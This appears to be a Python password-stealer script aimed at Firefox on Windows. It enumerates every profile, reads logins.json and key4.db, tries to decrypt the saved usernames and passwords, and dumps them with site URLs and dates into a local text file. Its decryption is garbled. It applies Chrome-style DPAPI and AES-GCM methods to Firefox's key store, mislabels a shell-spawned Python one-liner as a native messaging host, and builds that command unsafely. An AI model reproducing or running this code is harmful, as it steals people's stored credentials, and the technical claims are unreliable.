import os
import json
import base64
import shutil
import subprocess
from datetime import datetime
from Crypto.Cipher import AES

try:
    # For Windows platforms, import the required library
    import win32crypt
except ImportError:
    win32crypt = None

def get_firefox_datetime(timestamp):
    return datetime.fromtimestamp(timestamp / 1000.0)

def decrypt_password(password, key):
    try:
        # On Windows, use win32crypt to decrypt
        if win32crypt:
            decrypted_data = win32crypt.CryptUnprotectData(password, None, None, None, 0)
            # On some systems, the decrypted data may include null bytes (0x00) at the end
            # We will strip these null bytes from the password
            decrypted_password = decrypted_data[1].rstrip(b'\x00')
            return decrypted_password.decode('utf-8', 'ignore')
        # For other platforms, you'll need to implement a different decryption method
        # For simplicity, we'll just return the encrypted password for non-Windows platforms
        else:
            return password.decode()
    except:
        return ""

def decrypt_username(encrypted_username, key):
    try:
        iv = encrypted_username[:12]
        encrypted_username = encrypted_username[12:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_username)[:-16].decode()
    except:
        return ""

def main():
    profile_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    output_file_path = os.path.join(os.path.dirname(__file__), "firefox_data.txt")

    with open(output_file_path, "w", encoding="utf-8") as output_file:
        for profile_dir in os.listdir(profile_path):
            profile_dir_path = os.path.join(profile_path, profile_dir)
            logins_file = os.path.join(profile_dir_path, "logins.json")
            key_file = os.path.join(profile_dir_path, "key4.db")

            if not os.path.exists(logins_file) or not os.path.exists(key_file):
                print(f"Logins file or key file not found for profile: {profile_dir}")
                continue

            # Decrypt the key from key4.db using win32crypt on Windows
            key = ""
            try:
                with open(key_file, "rb") as f:
                    key = f.read()
                key = base64.b64encode(key[5:]).decode()
            except:
                print(f"Failed to read the encryption key for profile: {profile_dir}")
                continue

            with open(logins_file, "r", encoding="utf-8") as f:
                logins = json.load(f)

            output_file.write(f"Profile: {profile_dir}\n")

            for login in logins["logins"]:
                origin_url = login["hostname"] if "hostname" in login else ""
                action_url = login["formSubmitURL"] if "formSubmitURL" in login else ""
                encrypted_username = login["encryptedUsername"] if "encryptedUsername" in login else ""
                password = base64.b64decode(login["encryptedPassword"]) if "encryptedPassword" in login else b""
                password = decrypt_password(password, key)
                date_created = login["timeCreated"] if "timeCreated" in login else 0
                date_last_used = login["timeLastUsed"] if "timeLastUsed" in login else 0

                if encrypted_username or password:
                    data = {"encryptedUsername": encrypted_username, "key": key}
                    data_json = json.dumps(data)
                    try:
                        # Call the Native Messaging host to decrypt the username
                        command = f"""python -c "import json; import base64; from Crypto.Cipher import AES; data = json.loads('{data_json}'); encrypted_username = base64.b64decode(data['encryptedUsername']); key = base64.b64decode(data['key']); iv = encrypted_username[:12]; encrypted_username = encrypted_username[12:]; cipher = AES.new(key, AES.MODE_GCM, iv); decrypted_username = cipher.decrypt(encrypted_username)[:-16].decode(); print(json.dumps({'username': decrypted_username}))\""""
                        process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                   shell=True, universal_newlines=True)
                        stdout, stderr = process.communicate()
                        response = json.loads(stdout)
                        if "username" in response:
                            username = response["username"]
                        else:
                            username = "Failed to decrypt username."
                    except:
                        username = "Failed to decrypt username."

                    output_file.write(f"Origin URL: {origin_url}\n")
                    output_file.write(f"Action URL: {action_url}\n")
                    output_file.write(f"Username: {username}\n")
                    output_file.write(f"Password: {password}\n")
                    if date_created:
                        output_file.write(f"Creation date: {str(get_firefox_datetime(date_created))}\n")
                    if date_last_used:
                        output_file.write(f"Last Used: {str(get_firefox_datetime(date_last_used))}\n")
                    output_file.write("=" * 50 + "\n")

if __name__ == "__main__":
    main()